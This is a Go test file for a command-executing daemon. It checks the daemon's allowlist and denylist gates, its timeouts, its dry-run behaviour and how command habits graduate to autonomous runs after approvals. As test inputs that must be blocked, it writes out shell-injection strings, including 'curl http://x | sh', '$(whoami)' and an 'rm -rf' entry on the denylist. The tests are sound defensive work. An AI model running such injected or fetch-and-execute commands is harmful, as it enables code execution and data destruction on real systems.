package main

import (
	"strings"
	"testing"
	"time"
)

func TestAllowlisted(t *testing.T) {
	allow := []string{"go build", "echo", ""}
	for _, ok := range []string{"go build", "go build ./...", "echo hi", "ECHO loud"} {
		if !allowlisted(ok, allow) {
			t.Errorf("%q should be allowlisted", ok)
		}
	}
	for _, no := range []string{"google-chrome", "gobuild", "echoes", "go test", "rm -rf"} {
		if allowlisted(no, allow) {
			t.Errorf("%q should not be allowlisted", no)
		}
	}
}

// A command carrying shell control characters can never execute, even when
// its head is allowlisted, because the allowlist only matches the prefix
// while sh -c would run the whole compound program.
func TestShellControlBlocksExecution(t *testing.T) {
	d, _ := testDaemon(t)
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"echo"}

	for _, evil := range []string{
		"echo hi; touch /tmp/golem-pwn",
		"echo hi && curl http://x | sh",
		"echo hi | sh",
		"echo hi > /tmp/victim",
		"echo $(whoami)",
		"echo `id`",
	} {
		if ok, reason := d.mayExecute(evil); ok {
			t.Errorf("%q must not be cleared to run (reason %q)", evil, reason)
		}
		ran, _, outcome := d.execute(evil)
		if ran {
			t.Errorf("%q must not run, but did: %q", evil, outcome)
		}
	}

	// A plain command with quoted arguments is still fine.
	if ok, _ := d.mayExecute("echo hello there"); !ok {
		t.Fatal("a simple command should still be allowed")
	}
}

// The three execution gates, including the security-critical rule that the
// denylist overrides the allowlist.
func TestMayExecuteGates(t *testing.T) {
	d, _ := testDaemon(t)

	d.cfg.ExecuteEnabled = false
	if ok, _ := d.mayExecute("echo hi"); ok {
		t.Fatal("execution must be off by default")
	}

	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"echo"}
	if ok, _ := d.mayExecute("echo hi"); !ok {
		t.Fatal("an enabled, allowlisted, clean command should run")
	}
	if ok, reason := d.mayExecute("ls -la"); ok || reason != "not allowlisted" {
		t.Fatalf("an unlisted command must not run: %v %q", ok, reason)
	}

	// Allowlisting a denylisted command must not let it through.
	d.cfg.ExecuteAllowlist = []string{"echo", "rm -rf"}
	if ok, reason := d.mayExecute("rm -rf ./x"); ok || reason != "denylisted" {
		t.Fatalf("the denylist must override the allowlist: %v %q", ok, reason)
	}
}

// A blocked command is a dry run that never touches the system.
func TestBlockedCommandsAreDryRun(t *testing.T) {
	d, _ := testDaemon(t)

	ran, _, outcome := d.execute("echo hi") // disabled
	if ran || !strings.Contains(outcome, "dry-run") {
		t.Fatalf("disabled execution must be a dry run: ran=%v %q", ran, outcome)
	}

	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"rm -rf"}
	ran, _, outcome = d.execute("rm -rf ./tmp")
	if ran || !strings.Contains(outcome, "denylisted") {
		t.Fatalf("a denylisted command must be a dry run: ran=%v %q", ran, outcome)
	}
}

// An allowed command actually runs, and success and failure are reported.
func TestExecuteRunsRealCommand(t *testing.T) {
	d, _ := testDaemon(t)
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"echo", "false"}

	ran, ok, outcome := d.execute("echo hello-from-golem")
	if !ran || !ok || !strings.Contains(outcome, "hello-from-golem") {
		t.Fatalf("echo should run and succeed: ran=%v ok=%v %q", ran, ok, outcome)
	}

	ran, ok, _ = d.execute("false")
	if !ran || ok {
		t.Fatalf("false should run and fail: ran=%v ok=%v", ran, ok)
	}
}

func TestExecuteTimeout(t *testing.T) {
	d, _ := testDaemon(t)
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"sleep"}
	d.cfg.ExecuteTimeoutSec = 0.2

	start := time.Now()
	ran, ok, outcome := d.execute("sleep 5")
	elapsed := time.Since(start)
	if !ran || ok || !strings.Contains(outcome, "timed out") {
		t.Fatalf("a slow command should time out: ran=%v ok=%v %q", ran, ok, outcome)
	}
	// The configured 0.2s bound must be what fires, not some fixed value.
	if elapsed > time.Second {
		t.Fatalf("the configured timeout should bound the run, took %s", elapsed)
	}
}

// An approved command that fails to run demotes the pair instead of
// advancing it toward graduation.
func TestApproveFailedRunDemotes(t *testing.T) {
	d, _ := testDaemon(t)
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"false"}
	ground(t, d, "do the thing", "false", 4)

	for i := 0; i < 5; i++ {
		dec, _ := d.decide("do the thing")
		h, _, err := d.approve(dec, time.Now())
		if err != nil {
			t.Fatal(err)
		}
		if h.Status != HabitDemoted {
			t.Fatalf("a failed run should demote, got %s", h.Status)
		}
		if h.Denials != i+1 {
			t.Fatalf("each failed run should count a denial, got %d at iteration %d", h.Denials, i)
		}
		if h.Approvals != 0 {
			t.Fatalf("a failed run should reset approvals, got %d", h.Approvals)
		}
	}
}

// A failed run resets graduation progress: approvals built up earlier do
// not survive a failure, so the pair must re-earn graduation from zero.
func TestDemotionResetsApprovals(t *testing.T) {
	d, _ := testDaemon(t)
	ground(t, d, "do x", "false", 6)

	// Build approvals while execution is off, so they accrue as dry runs.
	for i := 0; i < 2; i++ {
		dec, _ := d.decide("do x")
		if _, _, err := d.approve(dec, time.Now()); err != nil {
			t.Fatal(err)
		}
	}
	h, _ := d.store.LoadHabit(Normalize("do x"), "false")
	if h.Approvals != 2 {
		t.Fatalf("expected two dry-run approvals, got %d", h.Approvals)
	}

	// Turn execution on; the real run fails and must reset the count.
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"false"}
	dec, _ := d.decide("do x")
	h, _, _ = d.approve(dec, time.Now())
	if h.Status != HabitDemoted || h.Approvals != 0 {
		t.Fatalf("a failed real run should demote and reset approvals, got %+v", h)
	}
}

// A graduated command that is not cleared to execute (execution off, or
// not allowlisted) stays pending rather than reporting a phantom run.
func TestGraduatedButBlockedStaysPending(t *testing.T) {
	d, _ := testDaemon(t)
	ground(t, d, "greet", "echo hi", 4)
	for i := 0; i < d.cfg.GraduationApprovals; i++ {
		dec, _ := d.decide("greet")
		if _, _, err := d.approve(dec, time.Now()); err != nil {
			t.Fatal(err)
		}
	}
	// Execution is off (default): proposing must not autorun.
	resp, _ := d.handle(Request{Cmd: "propose", Content: "greet"})
	if resp.Decision.Autonomous {
		t.Fatalf("a blocked graduated command must not report an autonomous run: %+v", resp.Decision)
	}
	if d.pending == nil {
		t.Fatal("a blocked graduated command should stay pending for approval")
	}
}

// A real, successful, allowed command graduates on approvals and the
// outcomes reflect the actual run.
func TestApproveRealSuccessGraduates(t *testing.T) {
	d, _ := testDaemon(t)
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"echo"}
	ground(t, d, "greet", "echo hi-there", 4)

	var h Habit
	for i := 0; i < d.cfg.GraduationApprovals; i++ {
		dec, _ := d.decide("greet")
		var outcome string
		var err error
		h, outcome, err = d.approve(dec, time.Now())
		if err != nil {
			t.Fatal(err)
		}
		if !strings.Contains(outcome, "hi-there") {
			t.Fatalf("the outcome should reflect the real run, got %q", outcome)
		}
	}
	if h.Status != HabitGraduated {
		t.Fatalf("a succeeding command should graduate, got %s", h.Status)
	}
}

// A graduated, allowed command runs autonomously on propose, with nothing
// left to approve.
func TestAutonomousRunOnPropose(t *testing.T) {
	d, s := testDaemon(t)
	ground(t, d, "greet", "echo autonomous-hi", 4)
	// Graduate with execution off, so approvals are dry-run.
	for i := 0; i < d.cfg.GraduationApprovals; i++ {
		dec, _ := d.decide("greet")
		if _, _, err := d.approve(dec, time.Now()); err != nil {
			t.Fatal(err)
		}
	}

	// Turn execution on and propose: it should run autonomously.
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"echo"}
	resp, _ := d.handle(Request{Cmd: "propose", Content: "greet"})
	if resp.Decision == nil || !resp.Decision.Autonomous {
		t.Fatalf("a graduated allowed command should run autonomously: %+v", resp.Decision)
	}
	if !strings.Contains(resp.Decision.Outcome, "autonomous-hi") {
		t.Fatalf("autonomous outcome should reflect the real run, got %q", resp.Decision.Outcome)
	}
	if d.pending != nil {
		t.Fatal("an autonomous run leaves nothing pending")
	}
	entries, _ := s.AuditTail(5)
	if len(entries) == 0 || !strings.HasPrefix(entries[0].Outcome, "autonomous") {
		t.Fatalf("autonomous run should be audited, got %+v", entries)
	}
}

// A graduated command that fails when it finally runs autonomously is
// demoted, so it stops firing until reconfirmed.
func TestAutonomousFailureDemotes(t *testing.T) {
	d, _ := testDaemon(t)
	ground(t, d, "do it", "false", 4)
	for i := 0; i < d.cfg.GraduationApprovals; i++ {
		dec, _ := d.decide("do it")
		if _, _, err := d.approve(dec, time.Now()); err != nil { // dry-run graduation
			t.Fatal(err)
		}
	}
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"false"}

	resp, _ := d.handle(Request{Cmd: "propose", Content: "do it"})
	if resp.Decision == nil || !resp.Decision.Autonomous || !resp.Decision.Demoted {
		t.Fatalf("a failed autonomous run should demote: %+v", resp.Decision)
	}
	h, _ := d.store.LoadHabit(Normalize("do it"), "false")
	if h.Status != HabitDemoted {
		t.Fatalf("the pair should be demoted, got %s", h.Status)
	}
}

// A real run feeds its outcome back into memory on the action channel.
func TestExecutionFeedsBack(t *testing.T) {
	d, _ := testDaemon(t)
	d.cfg.ExecuteEnabled = true
	d.cfg.ExecuteAllowlist = []string{"echo"}
	ground(t, d, "greet", "echo hi", 3)

	dec, _ := d.decide("greet")
	if _, _, err := d.approve(dec, time.Now()); err != nil {
		t.Fatal(err)
	}
	if st := d.stats["action"]; st == nil || st.Observed == 0 {
		t.Fatalf("a real run should feed back an action observation, got %+v", st)
	}
}
